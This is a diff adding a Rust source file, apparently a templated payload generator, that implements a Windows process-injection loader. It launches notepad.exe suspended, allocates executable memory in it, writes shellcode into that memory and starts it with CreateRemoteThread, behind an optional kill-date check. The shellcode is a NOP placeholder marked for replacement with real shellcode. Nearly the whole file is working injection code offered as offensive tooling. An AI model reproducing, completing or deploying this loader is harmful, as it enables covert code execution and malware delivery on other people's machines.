@@ -1,0 +1,74 @@
+use std::ffi::c_void;
+use std::ptr;
+use windows::Win32::System::Threading::{
+    CreateProcessA, CreateRemoteThread, ResumeThread, 
+    STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED
+};
+use windows::Win32::System::Memory::{
+    VirtualAllocEx, WriteProcessMemory, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
+};
+use windows::Win32::Foundation::{CloseHandle};
+use windows::core::{PCSTR, PSTR};
+use std::time::{SystemTime, UNIX_EPOCH};
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // Guardrails
+    {% if kill_date %}
+    let start = SystemTime::now();
+    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
+    if since_the_epoch.as_secs() > {{ kill_date_ts }} {
+        return Ok(());
+    }
+    {% endif %}
+
+    // Shellcode (NOPs - Replace with actual shellcode)
+    let shellcode: [u8; 4] = [0x90, 0x90, 0x90, 0x90];
+
+    let mut si = STARTUPINFOA::default();
+    let mut pi = PROCESS_INFORMATION::default();
+    
+    // Spawn Notepad
+    let mut command_line = String::from("notepad.exe\0");
+    
+    unsafe {
+        CreateProcessA(
+            PCSTR::null(),
+            PSTR(command_line.as_mut_ptr()),
+            None,
+            None,
+            false,
+            CREATE_SUSPENDED,
+            None,
+            PCSTR::null(),
+            &si,
+            &mut pi
+        )?;
+    }
+
+    // Allocate
+    let mem = unsafe {
+        VirtualAllocEx(pi.hProcess, None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    };
+
+    if mem.is_null() {
+        return Err("VirtualAllocEx failed".into());
+    }
+
+    // Write
+    unsafe {
+        WriteProcessMemory(pi.hProcess, mem, shellcode.as_ptr() as *const c_void, shellcode.len(), None)?;
+    }
+
+    // Execute
+    unsafe {
+        CreateRemoteThread(pi.hProcess, None, 0, Some(std::mem::transmute(mem)), None, 0, None)?;
+        ResumeThread(pi.hThread);
+    }
+    
+    unsafe {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    Ok(())
+}
